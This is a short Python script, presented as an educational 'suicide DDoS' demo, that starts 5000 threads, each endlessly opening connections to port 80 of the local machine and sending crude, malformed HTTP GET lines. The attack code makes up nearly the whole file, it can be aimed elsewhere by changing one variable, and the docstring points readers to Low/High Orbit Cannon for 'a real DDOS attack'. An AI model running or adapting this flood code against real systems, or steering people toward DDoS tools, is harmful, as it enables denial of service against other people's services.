'''

    AUTHOR : Abhishek Iyengar
    GITHUB: @tinshade
    LICENSE: GNU Public License
    #!SUICIDE DDOS!#
    ###### FOR EDUCATIONAL PURPOSES ONLY ######
    ###### PLEASE ADD ME IN THE CREDITS SECTION IF YOU PLAN TO USE THIS ######
    This small DDOS script attempts to DDOS the HTTP port of the PC running this script,
    hence the name. This makes use of Python's Threading module to achieve pseudo-multithreading.
    However, you would not use this for a real attack.
    The reason is since Python does not support multithreading, the script is too slow and quite obvious.
    I just made this to make use of the multithreading module with networking concepts.

    PS. Use tools like Low/High Orbit Canon if you need to try a real DDOS attack.

'''



import threading
import socket


hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname)
target = hostname
port = 80 #Attack HTTP


def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target,port))
		s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target,port))
		s.sendto(("Host /" + target + "\r\n\r\n").encode('ascii'), (target,port))
		s.close()


for i in range(5000):
	thread = threading.Thread(target = attack)
	thread.start()